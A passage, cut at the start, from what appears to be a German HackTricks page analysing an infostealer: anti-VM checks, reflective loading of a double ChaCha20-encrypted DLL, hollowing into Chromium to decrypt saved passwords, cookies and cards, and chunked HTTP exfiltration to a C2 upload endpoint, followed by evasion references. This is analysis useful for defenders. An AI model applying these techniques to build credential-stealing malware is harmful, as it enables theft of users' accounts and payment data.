- Variante B untersucht Systemeigenschaften (Mindestanzahl an Prozessen, kurze Uptime), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox Additions zu erkennen, und führt Timing-Prüfungen rund um Sleeps durch, um Single-Stepping zu erkennen. Jeder Treffer bricht den Ablauf ab, bevor die Module gestartet werden.

### Fileless helper + doppeltes ChaCha20-Reflective-Loading

- Die primäre DLL/EXE enthält einen Chromium-Credential-Helper, der entweder auf die Festplatte geschrieben oder manuell in den Speicher gemappt wird. Im fileless mode löst der Helper Imports/Relocations selbst auf, sodass keine Helper-Artefakte geschrieben werden.
- Dieser Helper speichert eine Second-Stage-DLL, die zweimal mit ChaCha20 verschlüsselt wurde (zwei 32-Byte-Schlüssel + 12-Byte-Nonces). Nach beiden Durchläufen lädt er den Blob reflectively (ohne `LoadLibrary`) und ruft die Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, die von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) abgeleitet sind.
- Die ChromElevator-Routinen verwenden direct-syscall reflective process hollowing, um Code in einen laufenden Chromium-Browser zu injizieren, AppBound-Encryption-Schlüssel zu übernehmen und Passwörter/Cookies/Kreditkarten direkt aus SQLite-Datenbanken zu entschlüsseln, trotz der ABE-Härtung.


### Modulare In-Memory-Sammlung & Chunked-HTTP-Exfiltration

- `create_memory_based_log` durchläuft eine globale `memory_generators`-Function-Pointer-Tabelle und startet für jedes aktivierte Modul (Telegram, Discord, Steam, Screenshots, Dokumente, Browser-Erweiterungen usw.) einen Thread. Jeder Thread schreibt Ergebnisse in gemeinsame Buffer und meldet nach einem Join-Fenster von etwa 45 Sekunden seine Dateianzahl.
- Nach Abschluss wird alles mit der statisch gelinkten `miniz`-Bibliothek als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` wartet anschließend 15 Sekunden und streamt das Archiv in 10-MB-Chunks per HTTP POST an `http://<C2>:6767/upload`, wobei eine Browser-`multipart/form-data`-Boundary (`----WebKitFormBoundary***`) vorgetäuscht wird. Jeder Chunk enthält `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`, und der letzte Chunk fügt `complete: true` hinzu, damit das C2 weiß, dass die Rekonstruktion abgeschlossen ist.

## Referenzen

- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – Blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, keine Freikarten mehr für Malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – Dokumentation](https://tradecraftgarden.org/docs.html)
- [simplehook – Beispiel](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – Beispiel](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – PIC mit Call-Stack-Spoofing](https://github.com/NtDallas/Draugr)
- [Unit42 – Neue Infektionskette und ConfuserEx-basierte Obfuscation für DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Sollte man seinem Zero Trust vertrauen? Umgehung von Zscaler-Posture-Checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Vor ToolShell: Untersuchung früherer Ransomware-Operationen von Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Missbrauch weitergeleiteter Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Inventar weitergeleiteter Exports von Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU-Referenz (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL-Launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – EDRs mit Unterstützung von Protected Process Light (PPL) bekämpfen](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Die Schutzschicht von Windows Defender mit der Folder-Redirect-Technik durchbrechen](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – Referenz zum mklink-Befehl](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Unter dem Pure Curtain: Vom RAT über den Builder zum Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer kommt in die Stadt: Ein neuer, ambitionierter Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Entschlüsselung der Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Node.js-Malware mit API-Tracing besiegen](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Adaptix mit Crystal Palace schlafen legen](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [Sleeping Beauty II: CFG, CET und Stack-Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko-Sleep-Obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)

{{#include ../banners/hacktricks-training.md}}
